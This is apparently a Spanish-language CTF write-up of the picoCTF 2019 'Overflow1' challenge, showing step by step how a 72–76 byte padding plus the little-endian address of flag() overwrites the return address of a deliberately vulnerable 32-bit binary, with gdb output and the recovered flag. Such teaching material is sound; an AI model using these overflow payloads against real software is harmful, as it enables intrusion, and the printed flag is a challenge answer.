---
layout      : post
title       : "PicoCTF2019 - Overflow1"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/CTF/picoctf/2019/overflow1/overflow1.jpeg
category    : [ article ]
tags        : [ buffer-overflow ]
---
Exploraremos un `Buffer Overflow` pa toda la familia, tendremos que moveremos a una función que contiene la flag.

> You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this [program](https://github.com/lanzt/blog/blob/main/assets/files/articles/CTF/picoctf/2019/overflow1/vuln)? You can find it in /problems/overflow-1_1_e792baa0d29d24699530e6a26071a260 on the shell server. [Source](https://github.com/lanzt/blog/blob/main/assets/files/articles/CTF/picoctf/2019/overflow1/vuln.c).

### Spanish writeup

El ejercicio nos dice que debemos lograr cambiar la dirección de retorno y que nos lleve a la función `flag`.

Ya con los archivos hacemos:

```bash
$ file *
vuln:      ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5d4cdc8dc51fb3e5d45c2a59c6a9cd7958382fc9, not stripped
vuln.c:    C source, ASCII text
```

Veamos que hace el programa:

```bash
$ ./vuln 
Give me a string and lets see what happens: 
hello
Woah, were jumping to 0x8048705 !
```

Simplemente nos pide un input y nos dice la instrucción a la que hemos saltado. Así que cuando logremos llegar a la función `flag`, supongo que nos mostrara la dirección.

Source [vuln.c](https://github.com/lanzt/blog/blob/main/assets/files/articles/CTF/picoctf/2019/overflow1/vuln.c).

```c
#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  ...
  fgets(buf,FLAGSIZE,f);
```

Algunos detalles de assembly antes de seguir:

| Registro | Arquitectura | Descripción |
| :------: | :----------: | :---------- |
| eip      | 32 bits      | El registro que almacena la siguiente instrucción a la cual ir |
| rip      | 64 bits      | Instruction pointer register |
| ebp      | 32 bits      | El registro que apunta a una ubicación fija dentro del marco de una función, así sera más fácil acceder a variables y argumentos |
| rbp      | 64 bits      | Base pointer register |

Siguiendo con el fuente, nos encontramos con un **buffer de 64**, haciendo la prueba de fuego:

```bash
$ python -c 'print "A"*64' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x8048705 !
```

Vemos que no pasa nada, ya que los siguientes `4 bits` guardaran la data que tenga el registro `ebp` y los siguientes 4 bytes tendrán la dirección de retorno (almacenada en `eip`).

* Lo explica [Dhaval Kapil en su brutal articulo](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/).

Sumaremos los **4 bytes del `eip`** y los **4 bytes del `ebp`**, se los agregamos a los **64 del buffer**:

```bash
$ python -c 'print "A"*72' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x8048705 !
Violación de segmento
```

Obtenemos el overflow, tamos bien.

Saquemos la direccion en memoria de la función `flag`. Lo podemos hacer con `gdb`, `objdump`, `ida`.. Usa el de preferencia.

```bash
$ gdb ./vuln
info functions
...
0x080485e6  flag
...
```

Un detalle importante para este paso es conocer si nuestro sistema es [little-endian o big-endian](http://wikitronica.labc.usb.ve/index.php/Little_Endian_y_Big_Endian).

Esto decidirá como va a leer nuestro porcesador el programa. Si eres un `little-endian` (un pequeño indio e.e), entonces debemos colocar la dirección de `flag` en reverso.

* Ejemplo: `0x080485e6  flag` entonces pondremos `e6` `85` `04` `08`.

```bash
$ python -c 'print "A"*72 + "\xe6\x85\x04\x08"' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x8048700 !
Woah, were jumping to 0x8048705 !
Violación de segmento
```

**¿Por que habrá salido dos veces la instrucción?**

```bash
$ gdb ./vuln -q
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
gdb-peda$ b vuln
Breakpoint 1 at 0x8048663
gdb-peda$ r <<< $(python -c 'print "A"*72 + "\xe6\x85\x04\x08"')
```

Continuamos...

```bash
gdb-peda$ c
Continuing.
Woah, were jumping to 0x8048700 !
[----------------------------------registers-----------------------------------]
EAX: 0x22 ('"')
EBX: 0x41414141 ('AAAA')
ECX: 0xffffffff 
EDX: 0xf7fa4010 --> 0x0 
ESI: 0xf7fa2000 --> 0x1d6d6c 
EDI: 0xf7fa2000 --> 0x1d6d6c 
EBP: 0xffffd1b8 --> 0x80485e6 (<flag>:	push   ebp)
ESP: 0xffffd1b4 ("AAAA\346\205\004\b\005\207\004\b\001")
```

Aún no hemos llegado a la dirección de la función `flag`

```bash
Woah, were jumping to 0x8048700 !
Woah, were jumping to 0x8048705 !
```

Si intentamos `"A"*73` vemos esto:

```bash
$ python -c 'print "A"*73 + "\xe6\x85\x04\x08"' | ./vuln
Woah, were jumping to 0x8040008 !
```

**Hemos cambiado el registro que direcciona!!**

Why?

> Sencillamente son los **4 bytes** que ocupa la dirección de la función `flag` que estamos agregando despues de imprimir las `"A"`.

```bash
$ python -c 'print "A"*76 + "\xe6\x85\x04\x08"' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
Flag File is Missing. please contact an Admin if you are running this on the shell server.
```

```bash
Woah, were jumping to 0x80485e6 !
```

Y ahí lo tenemos, estamos en la dirección de la función `flag`.

Si lo corremos en el servidor remoto de picoCTF:

```bash
pico-2019:/$ python -c 'print "A"*76 + "\xe6\x85\x04\x08"' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}Segmentation fault (core dumped)
```

<h3>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}</h3>

Tenemos la flag (: Y hemos corrompido el flujo del programa.